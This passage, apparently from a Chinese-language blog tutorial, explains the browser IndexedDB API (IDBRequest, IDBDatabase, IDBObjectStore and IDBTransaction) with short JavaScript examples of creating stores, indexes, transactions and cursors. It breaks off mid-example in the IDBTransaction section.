<h3 id="5、IDBRequest-对象"><a href="#5、IDBRequest-对象" class="headerlink" title="5、IDBRequest 对象"></a>5、IDBRequest 对象</h3><p>IDBRequest 对象表示打开的数据库连接，<code>indexedDB.open()</code>方法和<code>indexedDB.deleteDatabase()</code>方法会返回这个对象。数据库的操作都是通过这个对象完成的。</p>
<p>这个对象的所有操作都是异步操作，要通过<code>readyState</code>属性判断是否完成，如果为<code>pending</code>就表示操作正在进行，如果为<code>done</code>就表示操作完成，可能成功也可能失败。</p>
<p>操作完成以后，触发<code>success</code>事件或<code>error</code>事件，这时可以通过<code>result</code>属性和<code>error</code>属性拿到操作结果。如果在<code>pending</code>阶段，就去读取这两个属性，是会报错的。</p>
<p>IDBRequest 对象有以下属性。</p>
<ul>
<li><code>IDBRequest.readyState</code>：等于<code>pending</code>表示操作正在进行，等于<code>done</code>表示操作正在完成。</li>
<li><code>IDBRequest.result</code>：返回请求的结果。如果请求失败、结果不可用，读取该属性会报错。</li>
<li><code>IDBRequest.error</code>：请求失败时，返回错误对象。</li>
<li><code>IDBRequest.source</code>：返回请求的来源（比如索引对象或 ObjectStore）。</li>
<li><code>IDBRequest.transaction</code>：返回当前请求正在进行的事务，如果不包含事务，返回<code>null</code>。</li>
<li><code>IDBRequest.onsuccess</code>：指定<code>success</code>事件的监听函数。</li>
<li><code>IDBRequest.onerror</code>：指定<code>error</code>事件的监听函数。</li>
</ul>
<p>IDBOpenDBRequest 对象继承了 IDBRequest 对象，提供了两个额外的事件监听属性。</p>
<ul>
<li><code>IDBOpenDBRequest.onblocked</code>：指定<code>blocked</code>事件（<code>upgradeneeded</code>事件触发时，数据库仍然在使用）的监听函数。</li>
<li><code>IDBOpenDBRequest.onupgradeneeded</code>：<code>upgradeneeded</code>事件的监听函数。</li>
</ul>
<h3 id="6、IDBDatabase-对象"><a href="#6、IDBDatabase-对象" class="headerlink" title="6、IDBDatabase 对象"></a>6、IDBDatabase 对象</h3><p>打开数据成功以后，可以从<code>IDBOpenDBRequest</code>对象的<code>result</code>属性上面，拿到一个<code>IDBDatabase</code>对象，它表示连接的数据库。后面对数据库的操作，都通过这个对象完成。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> db;</span><br><span class="line"><span class="keyword">var</span> <span class="title class_">DBOpenRequest</span> = <span class="variable language_">window</span>.<span class="property">indexedDB</span>.<span class="title function_">open</span>(<span class="string">&#x27;demo&#x27;</span>, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"><span class="title class_">DBOpenRequest</span>.<span class="property">onerror</span> = <span class="keyword">function</span> (<span class="params">event</span>) &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;Error&#x27;</span>);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="title class_">DBOpenRequest</span>.<span class="property">onsuccess</span> = <span class="keyword">function</span>(<span class="params">event</span>) &#123;</span><br><span class="line">  db = <span class="title class_">DBOpenRequest</span>.<span class="property">result</span>;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h4 id="6-1-属性"><a href="#6-1-属性" class="headerlink" title="6.1 属性"></a>6.1 属性</h4><p>IDBDatabase 对象有以下属性。</p>
<ul>
<li><code>IDBDatabase.name</code>：字符串，数据库名称。</li>
<li><code>IDBDatabase.version</code>：整数，数据库版本。数据库第一次创建时，该属性为空字符串。</li>
<li><code>IDBDatabase.objectStoreNames</code>：DOMStringList 对象（字符串的集合），包含当前数据的所有 object store 的名字。</li>
<li><code>IDBDatabase.onabort</code>：指定 abort 事件（事务中止）的监听函数。</li>
<li><code>IDBDatabase.onclose</code>：指定 close 事件（数据库意外关闭）的监听函数。</li>
<li><code>IDBDatabase.onerror</code>：指定 error 事件（访问数据库失败）的监听函数。</li>
<li><code>IDBDatabase.onversionchange</code>：数据库版本变化时触发（发生<code>upgradeneeded</code>事件，或调用<code>indexedDB.deleteDatabase()</code>）。</li>
</ul>
<p>下面是<code>objectStoreNames</code>属性的例子。该属性返回一个 DOMStringList 对象，包含了当前数据库所有对象仓库的名称（即表名），可以使用 DOMStringList 对象的<code>contains</code>方法，检查数据库是否包含某个对象仓库。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!db.<span class="property">objectStoreNames</span>.<span class="title function_">contains</span>(<span class="string">&#x27;firstOS&#x27;</span>)) &#123;</span><br><span class="line">  db.<span class="title function_">createObjectStore</span>(<span class="string">&#x27;firstOS&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>上面代码先判断某个对象仓库是否存在，如果不存在就创建该对象仓库。</p>
<h4 id="6-2-方法"><a href="#6-2-方法" class="headerlink" title="6.2 方法"></a>6.2 方法</h4><p>IDBDatabase 对象有以下方法。</p>
<ul>
<li><code>IDBDatabase.close()</code>：关闭数据库连接，实际会等所有事务完成后再关闭。</li>
<li><code>IDBDatabase.createObjectStore()</code>：创建存放数据的对象仓库，类似于传统关系型数据库的表格，返回一个 IDBObjectStore 对象。该方法只能在<code>versionchange</code>事件监听函数中调用。</li>
<li><code>IDBDatabase.deleteObjectStore()</code>：删除指定的对象仓库。该方法只能在<code>versionchange</code>事件监听函数中调用。</li>
<li><code>IDBDatabase.transaction()</code>：返回一个 IDBTransaction 事务对象。</li>
</ul>
<p>下面是<code>createObjectStore()</code>方法的例子。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> request = <span class="variable language_">window</span>.<span class="property">indexedDB</span>.<span class="title function_">open</span>(<span class="string">&#x27;demo&#x27;</span>, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">request.<span class="property">onupgradeneeded</span> = <span class="keyword">function</span> (<span class="params">event</span>) &#123;</span><br><span class="line">  <span class="keyword">var</span> db = event.<span class="property">target</span>.<span class="property">result</span>;</span><br><span class="line"></span><br><span class="line">  db.<span class="property">onerror</span> = <span class="keyword">function</span>(<span class="params">event</span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;error&#x27;</span>);</span><br><span class="line">  &#125;;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">var</span> objectStore = db.<span class="title function_">createObjectStore</span>(<span class="string">&#x27;items&#x27;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>上面代码创建了一个名为<code>items</code>的对象仓库，如果该对象仓库已经存在，就会抛出一个错误。为了避免出错，需要用到下文的<code>objectStoreNames</code>属性，检查已有哪些对象仓库。</p>
<p><code>createObjectStore()</code>方法还可以接受第二个对象参数，用来设置对象仓库的属性。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">db.<span class="title function_">createObjectStore</span>(<span class="string">&#x27;test&#x27;</span>, &#123; <span class="attr">keyPath</span>: <span class="string">&#x27;email&#x27;</span> &#125;);</span><br><span class="line">db.<span class="title function_">createObjectStore</span>(<span class="string">&#x27;test2&#x27;</span>, &#123; <span class="attr">autoIncrement</span>: <span class="literal">true</span> &#125;);</span><br></pre></td></tr></table></figure>

<p>上面代码中，<code>keyPath</code>属性表示主键（由于主键的值不能重复，所以上例存入之前，必须保证数据的<code>email</code>属性值都是不一样的），默认值为<code>null</code>；<code>autoIncrement</code>属性表示，是否使用自动递增的整数作为主键（第一个数据记录为1，第二个数据记录为2，以此类推），默认为<code>false</code>。一般来说，<code>keyPath</code>和<code>autoIncrement</code>属性只要使用一个就够了，如果两个同时使用，表示主键为递增的整数，且对象不得缺少<code>keyPath</code>指定的属性。</p>
<p>下面是<code>deleteObjectStore()</code>方法的例子。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> dbName = <span class="string">&#x27;sampleDB&#x27;</span>;</span><br><span class="line"><span class="keyword">var</span> dbVersion = <span class="number">2</span>;</span><br><span class="line"><span class="keyword">var</span> request = indexedDB.<span class="title function_">open</span>(dbName, dbVersion);</span><br><span class="line"></span><br><span class="line">request.<span class="property">onupgradeneeded</span> = <span class="keyword">function</span>(<span class="params">e</span>) &#123;</span><br><span class="line">  <span class="keyword">var</span> db = request.<span class="property">result</span>;</span><br><span class="line">  <span class="keyword">if</span> (e.<span class="property">oldVersion</span> &lt; <span class="number">1</span>) &#123;</span><br><span class="line">    db.<span class="title function_">createObjectStore</span>(<span class="string">&#x27;store1&#x27;</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (e.<span class="property">oldVersion</span> &lt; <span class="number">2</span>) &#123;</span><br><span class="line">    db.<span class="title function_">deleteObjectStore</span>(<span class="string">&#x27;store1&#x27;</span>);</span><br><span class="line">    db.<span class="title function_">createObjectStore</span>(<span class="string">&#x27;store2&#x27;</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>下面是<code>transaction()</code>方法的例子，该方法用于创建一个数据库事务，返回一个 IDBTransaction 对象。向数据库添加数据之前，必须先创建数据库事务。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> t = db.<span class="title function_">transaction</span>([<span class="string">&#x27;items&#x27;</span>], <span class="string">&#x27;readwrite&#x27;</span>);</span><br></pre></td></tr></table></figure>

<p><code>transaction()</code>方法接受两个参数：第一个参数是一个数组，里面是所涉及的对象仓库，通常是只有一个；第二个参数是一个表示操作类型的字符串。目前，操作类型只有两种：<code>readonly</code>（只读）和<code>readwrite</code>（读写）。添加数据使用<code>readwrite</code>，读取数据使用<code>readonly</code>。第二个参数是可选的，省略时默认为<code>readonly</code>模式。</p>
<h3 id="7、IDBObjectStore-对象"><a href="#7、IDBObjectStore-对象" class="headerlink" title="7、IDBObjectStore 对象"></a>7、IDBObjectStore 对象</h3><p>IDBObjectStore 对象对应一个对象仓库（object store）。<code>IDBDatabase.createObjectStore()</code>方法返回的就是一个 IDBObjectStore 对象。</p>
<p>IDBDatabase 对象的<code>transaction()</code>返回一个事务对象，该对象的<code>objectStore()</code>方法返回 IDBObjectStore 对象，因此可以采用下面的链式写法。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">db.<span class="title function_">transaction</span>([<span class="string">&#x27;test&#x27;</span>], <span class="string">&#x27;readonly&#x27;</span>)</span><br><span class="line">  .<span class="title function_">objectStore</span>(<span class="string">&#x27;test&#x27;</span>)</span><br><span class="line">  .<span class="title function_">get</span>(X)</span><br><span class="line">  .<span class="property">onsuccess</span> = <span class="keyword">function</span> (<span class="params">e</span>) &#123;&#125;</span><br></pre></td></tr></table></figure>



<h4 id="7-1-属性"><a href="#7-1-属性" class="headerlink" title="7.1 属性"></a>7.1 属性</h4><p>IDBObjectStore 对象有以下属性。</p>
<ul>
<li><code>IDBObjectStore.indexNames</code>：返回一个类似数组的对象（DOMStringList），包含了当前对象仓库的所有索引。</li>
<li><code>IDBObjectStore.keyPath</code>：返回当前对象仓库的主键。</li>
<li><code>IDBObjectStore.name</code>：返回当前对象仓库的名称。</li>
<li><code>IDBObjectStore.transaction</code>：返回当前对象仓库所属的事务对象。</li>
<li><code>IDBObjectStore.autoIncrement</code>：布尔值，表示主键是否会自动递增。</li>
</ul>
<h4 id="7-2-方法"><a href="#7-2-方法" class="headerlink" title="7.2 方法"></a>7.2 方法</h4><p>IDBObjectStore 对象有以下方法。</p>
<p><strong>（1）IDBObjectStore.add()</strong></p>
<p><code>IDBObjectStore.add()</code>用于向对象仓库添加数据，返回一个 IDBRequest 对象。该方法只用于添加数据，如果主键相同会报错，因此更新数据必须使用<code>put()</code>方法。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">objectStore.<span class="title function_">add</span>(value, key)</span><br></pre></td></tr></table></figure>

<p>该方法接受两个参数，第一个参数是键值，第二个参数是主键，该参数可选，如果省略默认为<code>null</code>。</p>
<p>创建事务以后，就可以获取对象仓库，然后使用<code>add()</code>方法往里面添加数据了。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> db;</span><br><span class="line"><span class="keyword">var</span> <span class="title class_">DBOpenRequest</span> = <span class="variable language_">window</span>.<span class="property">indexedDB</span>.<span class="title function_">open</span>(<span class="string">&#x27;demo&#x27;</span>, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"><span class="title class_">DBOpenRequest</span>.<span class="property">onsuccess</span> = <span class="keyword">function</span> (<span class="params">event</span>) &#123;</span><br><span class="line">  db = <span class="title class_">DBOpenRequest</span>.<span class="property">result</span>;</span><br><span class="line">  <span class="keyword">var</span> transaction = db.<span class="title function_">transaction</span>([<span class="string">&#x27;items&#x27;</span>], <span class="string">&#x27;readwrite&#x27;</span>);</span><br><span class="line"></span><br><span class="line">  transaction.<span class="property">oncomplete</span> = <span class="keyword">function</span> (<span class="params">event</span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;transaction success&#x27;</span>);</span><br><span class="line">  &#125;;</span><br><span class="line"></span><br><span class="line">  transaction.<span class="property">onerror</span> = <span class="keyword">function</span> (<span class="params">event</span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;transaction error: &#x27;</span> + transaction.<span class="property">error</span>);</span><br><span class="line">  &#125;;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">var</span> objectStore = transaction.<span class="title function_">objectStore</span>(<span class="string">&#x27;items&#x27;</span>);</span><br><span class="line">  <span class="keyword">var</span> objectStoreRequest = objectStore.<span class="title function_">add</span>(&#123; <span class="attr">foo</span>: <span class="number">1</span> &#125;);</span><br><span class="line"></span><br><span class="line">  objectStoreRequest.<span class="property">onsuccess</span> = <span class="keyword">function</span> (<span class="params">event</span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;add data success&#x27;</span>);</span><br><span class="line">  &#125;;</span><br><span class="line"></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p><strong>（2）IDBObjectStore.put()</strong></p>
<p><code>IDBObjectStore.put()</code>方法用于更新某个主键对应的数据记录，如果对应的键值不存在，则插入一条新的记录。该方法返回一个 IDBRequest 对象。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">objectStore.<span class="title function_">put</span>(item, key)</span><br></pre></td></tr></table></figure>

<p>该方法接受两个参数，第一个参数为新数据，第二个参数为主键，该参数可选，且只在自动递增时才有必要提供，因为那时主键不包含在数据值里面。</p>
<p><strong>（3）IDBObjectStore.clear()</strong></p>
<p><code>IDBObjectStore.clear()</code>删除当前对象仓库的所有记录。该方法返回一个 IDBRequest 对象。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">objectStore.<span class="title function_">clear</span>()</span><br></pre></td></tr></table></figure>

<p>该方法不需要参数。</p>
<p><strong>（4）IDBObjectStore.delete()</strong></p>
<p><code>IDBObjectStore.delete()</code>方法用于删除指定主键的记录。该方法返回一个 IDBRequest 对象。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">objectStore.<span class="title function_">delete</span>(<span class="title class_">Key</span>)</span><br></pre></td></tr></table></figure>

<p>该方法的参数为主键的值。</p>
<p><strong>（5）IDBObjectStore.count()</strong></p>
<p><code>IDBObjectStore.count()</code>方法用于计算记录的数量。该方法返回一个 IDBRequest 对象。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">IDBObjectStore</span>.<span class="title function_">count</span>(key)</span><br></pre></td></tr></table></figure>

<p>不带参数时，该方法返回当前对象仓库的所有记录数量。如果主键或 IDBKeyRange 对象作为参数，则返回对应的记录数量。</p>
<p><strong>（6）IDBObjectStore.getKey()</strong></p>
<p><code>IDBObjectStore.getKey()</code>用于获取主键。该方法返回一个 IDBRequest 对象。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">objectStore.<span class="title function_">getKey</span>(key)</span><br></pre></td></tr></table></figure>

<p>该方法的参数可以是主键值或 IDBKeyRange 对象。</p>
<p><strong>（7）IDBObjectStore.get()</strong></p>
<p><code>IDBObjectStore.get()</code>用于获取主键对应的数据记录。该方法返回一个 IDBRequest 对象。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">objectStore.<span class="title function_">get</span>(key)</span><br></pre></td></tr></table></figure>

<p><strong>（8）IDBObjectStore.getAll()</strong></p>
<p><code>DBObjectStore.getAll()</code>用于获取对象仓库的记录。该方法返回一个 IDBRequest 对象。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 获取所有记录</span></span><br><span class="line">objectStore.<span class="title function_">getAll</span>()</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取所有符合指定主键或 IDBKeyRange 的记录</span></span><br><span class="line">objectStore.<span class="title function_">getAll</span>(query)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 指定获取记录的数量</span></span><br><span class="line">objectStore.<span class="title function_">getAll</span>(query, count)</span><br></pre></td></tr></table></figure>

<p><strong>（9）IDBObjectStore.getAllKeys()</strong></p>
<p><code>IDBObjectStore.getAllKeys()</code>用于获取所有符合条件的主键。该方法返回一个 IDBRequest 对象。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 获取所有记录的主键</span></span><br><span class="line">objectStore.<span class="title function_">getAllKeys</span>()</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取所有符合条件的主键</span></span><br><span class="line">objectStore.<span class="title function_">getAllKeys</span>(query)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 指定获取主键的数量</span></span><br><span class="line">objectStore.<span class="title function_">getAllKeys</span>(query, count)</span><br></pre></td></tr></table></figure>

<p><strong>（10）IDBObjectStore.index()</strong></p>
<p><code>IDBObjectStore.index()</code>方法返回指定名称的索引对象 IDBIndex。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">objectStore.<span class="title function_">index</span>(name)</span><br></pre></td></tr></table></figure>

<p>有了索引以后，就可以针对索引所在的属性读取数据。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> t = db.<span class="title function_">transaction</span>([<span class="string">&#x27;people&#x27;</span>], <span class="string">&#x27;readonly&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> store = t.<span class="title function_">objectStore</span>(<span class="string">&#x27;people&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> index = store.<span class="title function_">index</span>(<span class="string">&#x27;name&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> request = index.<span class="title function_">get</span>(<span class="string">&#x27;foo&#x27;</span>);</span><br></pre></td></tr></table></figure>

<p>上面代码打开对象仓库以后，先用<code>index()</code>方法指定获取<code>name</code>属性的索引，然后用<code>get()</code>方法读取某个<code>name</code>属性(<code>foo</code>)对应的数据。如果<code>name</code>属性不是对应唯一值，这时<code>get()</code>方法有可能取回多个数据对象。另外，<code>get()</code>是异步方法，读取成功以后，只能在<code>success</code>事件的监听函数中处理数据。</p>
<p><strong>（11）IDBObjectStore.createIndex()</strong></p>
<p><code>IDBObjectStore.createIndex()</code>方法用于新建当前数据库的一个索引。该方法只能在<code>VersionChange</code>监听函数里面调用。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">objectStore.<span class="title function_">createIndex</span>(indexName, keyPath, objectParameters)</span><br></pre></td></tr></table></figure>

<p>该方法可以接受三个参数。</p>
<ul>
<li>indexName：索引名</li>
<li>keyPath：主键</li>
<li>objectParameters：配置对象（可选）</li>
</ul>
<p>第三个参数可以配置以下属性。</p>
<ul>
<li>unique：如果设为<code>true</code>，将不允许重复的值</li>
<li>multiEntry：如果设为<code>true</code>，对于有多个值的主键数组，每个值将在索引里面新建一个条目，否则主键数组对应一个条目。</li>
</ul>
<p>假定对象仓库中的数据记录都是如下的<code>person</code>类型。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> person = &#123;</span><br><span class="line">  <span class="attr">name</span>: name,</span><br><span class="line">  <span class="attr">email</span>: email,</span><br><span class="line">  <span class="attr">created</span>: <span class="keyword">new</span> <span class="title class_">Date</span>()</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>可以指定这个对象的某个属性来建立索引。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> store = db.<span class="title function_">createObjectStore</span>(<span class="string">&#x27;people&#x27;</span>, &#123; <span class="attr">autoIncrement</span>: <span class="literal">true</span> &#125;);</span><br><span class="line"></span><br><span class="line">store.<span class="title function_">createIndex</span>(<span class="string">&#x27;name&#x27;</span>, <span class="string">&#x27;name&#x27;</span>, &#123; <span class="attr">unique</span>: <span class="literal">false</span> &#125;);</span><br><span class="line">store.<span class="title function_">createIndex</span>(<span class="string">&#x27;email&#x27;</span>, <span class="string">&#x27;email&#x27;</span>, &#123; <span class="attr">unique</span>: <span class="literal">true</span> &#125;);</span><br></pre></td></tr></table></figure>

<p>上面代码告诉索引对象，<code>name</code>属性不是唯一值，<code>email</code>属性是唯一值。</p>
<p><strong>（12）IDBObjectStore.deleteIndex()</strong></p>
<p><code>IDBObjectStore.deleteIndex()</code>方法用于删除指定的索引。该方法只能在<code>VersionChange</code>监听函数里面调用。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">objectStore.<span class="title function_">deleteIndex</span>(indexName)</span><br></pre></td></tr></table></figure>

<p><strong>（13）IDBObjectStore.openCursor()</strong></p>
<p><code>IDBObjectStore.openCursor()</code>用于获取一个指针对象。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">IDBObjectStore</span>.<span class="title function_">openCursor</span>()</span><br></pre></td></tr></table></figure>

<p>指针对象可以用来遍历数据。该对象也是异步的，有自己的<code>success</code>和<code>error</code>事件，可以对它们指定监听函数。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> t = db.<span class="title function_">transaction</span>([<span class="string">&#x27;test&#x27;</span>], <span class="string">&#x27;readonly&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> store = t.<span class="title function_">objectStore</span>(<span class="string">&#x27;test&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> cursor = store.<span class="title function_">openCursor</span>();</span><br><span class="line"></span><br><span class="line">cursor.<span class="property">onsuccess</span> = <span class="keyword">function</span> (<span class="params">event</span>) &#123;</span><br><span class="line">  <span class="keyword">var</span> res = event.<span class="property">target</span>.<span class="property">result</span>;</span><br><span class="line">  <span class="keyword">if</span> (res) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;Key&#x27;</span>, res.<span class="property">key</span>);</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">dir</span>(<span class="string">&#x27;Data&#x27;</span>, res.<span class="property">value</span>);</span><br><span class="line">    res.<span class="title function_">continue</span>();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>监听函数接受一个事件对象作为参数，该对象的<code>target.result</code>属性指向当前数据记录。该记录的<code>key</code>和<code>value</code>分别返回主键和键值（即实际存入的数据）。<code>continue()</code>方法将光标移到下一个数据对象，如果当前数据对象已经是最后一个数据了，则光标指向<code>null</code>。</p>
<p><code>openCursor()</code>方法的第一个参数是主键值，或者一个 IDBKeyRange 对象。如果指定该参数，将只处理包含指定主键的记录；如果省略，将处理所有的记录。该方法还可以接受第二个参数，表示遍历方向，默认值为<code>next</code>，其他可能的值为<code>prev</code>、<code>nextunique</code>和<code>prevunique</code>。后两个值表示如果遇到重复值，会自动跳过。</p>
<p><strong>（14）IDBObjectStore.openKeyCursor()</strong></p>
<p><code>IDBObjectStore.openKeyCursor()</code>用于获取一个主键指针对象。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">IDBObjectStore</span>.<span class="title function_">openKeyCursor</span>()</span><br></pre></td></tr></table></figure>



<h3 id="8、IDBTransaction-对象"><a href="#8、IDBTransaction-对象" class="headerlink" title="8、IDBTransaction 对象"></a>8、IDBTransaction 对象</h3><p>IDBTransaction 对象用来异步操作数据库事务，所有的读写操作都要通过这个对象进行。</p>
<p><code>IDBDatabase.transaction()</code>方法返回的就是一个 IDBTransaction 对象。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> db;</span><br><span class="line"><span class="keyword">var</span> <span class="title class_">DBOpenRequest</span> = <span class="variable language_">window</span>.<span class="property">indexedDB</span>.<span class="title function_">open</span>(<span class="string">&#x27;demo&#x27;</span>, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"><span class="title class_">DBOpenRequest</span>.<span class="property">onsuccess</span> = <span class="keyword">function</span>(<span class="params">event</span>) &#123;</span><br><span class="line">  db = <span class="title class_">DBOpenRequest</span>.<span class="property">result</span>;</span><br><span class="line">  <span class="keyword">var</span> transaction = db.<span class="title function_">transaction</span>([<span class="string">&#x27;demo&#x27;</span>], <span class="string">&#x27;readwrite&#x27;</span>);</span><br><span class="line"></span><br><span class="line">  transaction.<span class="property">oncomplete</span> = <span class="keyword">function</span> (<span class="params">event</span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;transaction success&#x27;</span>);</span><br><span class="line">  &#125;;</span><br><span 